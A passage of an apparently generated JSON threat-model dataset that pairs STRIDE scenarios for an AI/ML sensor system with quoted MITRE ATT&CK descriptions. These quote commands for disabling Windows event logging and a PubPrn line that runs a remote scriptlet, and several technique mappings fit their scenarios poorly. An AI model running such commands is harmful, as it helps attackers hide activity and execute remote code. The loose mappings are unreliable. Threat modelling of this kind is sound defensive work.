            "MITRE ATT&CK Keywords": [
                "Model Exploitation",
                "Machine Learning Vulnerability",
                "System Access",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "SID-History Injection",
                "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
                "id": "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d",
                "technique_id": "T1178"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by stealing their biometric data through compromised sensors.",
            "Assumptions": [
                {
                    "Assumption": "Sensors capturing biometric data are not secured and can be tampered with.",
                    "Role": "Attacker",
                    "Condition": "The sensors do not have encryption mechanisms."
                },
                {
                    "Assumption": "The attacker has physical access to the environment to tamper with sensors.",
                    "Role": "Attacker",
                    "Condition": "The environment is left unsupervised."
                }
            ],
            "Potential Impact": "Unauthorized access to restricted areas or data.",
            "MITRE ATT&CK Keywords": [
                "biometric data",
                "sensor",
                "impersonation",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a malicious device to spoof legitimate user devices and gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can introduce a rogue device into the network.",
                    "Role": "Attacker",
                    "Condition": "Network access controls are insufficient."
                },
                {
                    "Assumption": "The network does not use strong device authentication mechanisms.",
                    "Role": "Defender",
                    "Condition": "Weak or no device authentication protocols are in place."
                }
            ],
            "Potential Impact": "Compromise of sensitive data and user accounts.",
            "MITRE ATT&CK Keywords": [
                "rogue device",
                "network",
                "device authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers spoof communication between sensors and actuators to perform unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encryption in communication channels between sensors and actuators.",
                    "Role": "Attacker",
                    "Condition": "The communication channels use plain text."
                },
                {
                    "Assumption": "Attackers have access to the communication network.",
                    "Role": "Attacker",
                    "Condition": "Insufficient network security measures."
                }
            ],
            "Potential Impact": "Unintended actions causing disruption or harm, such as triggering alarms or unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "communication",
                "sensor",
                "actuator",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor data before it reaches the AI/ML models.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the data transmission path.",
                    "Role": "Attacker",
                    "Condition": "Weak network security."
                },
                {
                    "Assumption": "Data integrity checks are not enforced or can be bypassed.",
                    "Role": "Defender",
                    "Condition": "Lack of integrity validation mechanisms."
                }
            ],
            "Potential Impact": "Erroneous decisions made by AI/ML models, leading to incorrect environmental responses.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "AI models",
                "network security",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with unauthorized access modifies system configurations stored in data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access control mechanisms on data repositories.",
                    "Role": "Defender",
                    "Condition": "Weak or no access control policies."
                },
                {
                    "Assumption": "The attacker has credentials with elevated privileges.",
                    "Role": "Attacker",
                    "Condition": "Credentials are compromised or poorly managed."
                }
            ],
            "Potential Impact": "Altered system behavior, degradation in service, or security breaches.",
            "MITRE ATT&CK Keywords": [
                "configurations",
                "data repositories",
                "access control"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers alter the source code of embedded software in actuators to perform unintended actions.",
            "Assumptions": [
                {
                    "Assumption": "Actuators are running unverified or insecure firmware.",
                    "Role": "Defender",
                    "Condition": "Firmware is not properly authenticated."
                },
                {
                    "Assumption": "The attacker has the capability to inject malicious code.",
                    "Role": "Attacker",
                    "Condition": "Lack of proper update mechanisms or code validation."
                }
            ],
            "Potential Impact": "Malfunctioning actuators could lead to physical harm or security breaches.",
            "MITRE ATT&CK Keywords": [
                "embedded software",
                "actuators",
                "malicious code"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user conducts malicious activities and denies responsibility due to lack of audit logs.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks detailed and tamper-proof audit logging.",
                    "Role": "Defender",
                    "Condition": "Audit logs are either not generated or are easily editable."
                },
                {
                    "Assumption": "User actions are not traceable to individual users.",
                    "Role": "Defender",
                    "Condition": "Poor logging and monitoring mechanisms."
                }
            ],
            "Potential Impact": "Difficulty in investigating and proving malicious activities.",
            "MITRE ATT&CK Keywords": [
                "audit logs",
                "accountability",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Inadequate transaction records allow a user to deny having made a device control command.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not include sufficient detail to track and attribute commands.",
                    "Role": "Defender",
                    "Condition": "Lack of comprehensive logging system."
                },
                {
                    "Assumption": "System time synchronization is unreliable, causing log discrepancies.",
                    "Role": "Defender",
                    "Condition": "No robust time synchronization mechanism."
                }
            ],
            "Potential Impact": "Inability to determine true command origin, reducing trust in the system.",
            "MITRE ATT&CK Keywords": [
                "transaction records",
                "device control",
                "time synchronization"
            ],
            "mitre_technique": {
                "name": "Time Providers",
                "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
                "id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
                "technique_id": "T1547.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised user device sends unauthorized commands, and the user denies accountability.",
            "Assumptions": [
                {
                    "Assumption": "Weak device authentication mechanisms.",
                    "Role": "Defender",
                    "Condition": "Devices are not properly authenticated."
                },
                {
                    "Assumption": "Logging and monitoring of commands is insufficient.",
                    "Role": "Defender",
                    "Condition": "Inadequate logging and monitoring transparency."
                }
            ],
            "Potential Impact": "Difficulty in tracking and holding entities accountable for malicious activities.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "command",
                "authentication"
            ],
            "mitre_technique": {
                "name": "PubPrn",
                "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
                "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
                "technique_id": "T1216.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized user intercepts sensitive data transmitted between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "Defender",
                    "Condition": "Unencrypted communication channels."
                },
                {
                    "Assumption": "An attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Inadequate network access control mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information such as biometric data.",
            "MITRE ATT&CK Keywords": [
                "unencrypted data",
                "network access",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Network Trust Dependencies",
                "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e",
                "technique_id": "T1590.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attackers exploit vulnerabilities in the cloud storage system to access user profiles and historical data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage has vulnerabilities that can be exploited.",
                    "Role": "Defender",
                    "Condition": "Unpatched security vulnerabilities."
                },
                {
                    "Assumption": "Cloud storage does not enforce strong access controls.",
                    "Role": "Defender",
                    "Condition": "Weak or improper access control settings."
                }
            ],
            "Potential Impact": "Exposure of sensitive user data and historical records.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "user profiles",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal employees access sensitive data they are not authorized to view.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient internal access control policies.",
                    "Role": "Defender",
                    "Condition": "Lack of role-based access controls."
                },
                {
                    "Assumption": "No regular monitoring of access patterns to identify unauthorized access.",
                    "Role": "Defender",
                    "Condition": "Inadequate auditing mechanisms."
                }
            ],
            "Potential Impact": "Breach of data confidentiality leading to privacy violations.",
            "MITRE ATT&CK Keywords": [
                "internal threat",
                "access control",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with malicious traffic, disrupting communication between system components.",
            "Assumptions": [
                {
                    "Assumption": "Network bandwidth can be overwhelmed by high traffic volumes.",
                    "Role": "Attacker",
                    "Condition": "Network lacks rate-limiting mechanisms."
                },
                {
                    "Assumption": "No defense mechanisms against network-level attacks.",
                    "Role": "Defender",
                    "Condition": "Absence of network firewalls and intrusion detection systems."
                }
            ],
            "Potential Impact": "Service disruption causing system downtime and unavailability.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "network traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actors target the cloud servers hosting AI/ML models with DoS attacks.",
            "Assumptions": [
                {
                    "Assumption": "Cloud servers can be overwhelmed with high request volumes.",
                    "Role": "Attacker",
                    "Condition": "Servers lack auto-scaling and DoS protection."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms in place.",
                    "Role": "Defender",
                    "Condition": "Single points of failure in the system architecture."
                }
            ],
            "Potential Impact": "Unavailability of AI/ML services leading to system inoperability.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "AI/ML models",
                "DoS attack"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers exploit vulnerabilities in user devices to overload the system with fake commands.",
            "Assumptions": [
                {
                    "Assumption": "User devices have unpatched vulnerabilities.",
                    "Role": "Defender",
                    "Condition": "Devices run outdated software."
                },
                {
                    "Assumption": "The system does not have rate-limiting or command validation mechanisms.",
                    "Role": "Defender",
                    "Condition": "Weak input validation and rate-limiting."
                }
            ],
            "Potential Impact": "Disruption in system functionality due to command overload.",
            "MITRE ATT&CK Keywords": [
                "user devices",
                "fake commands",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
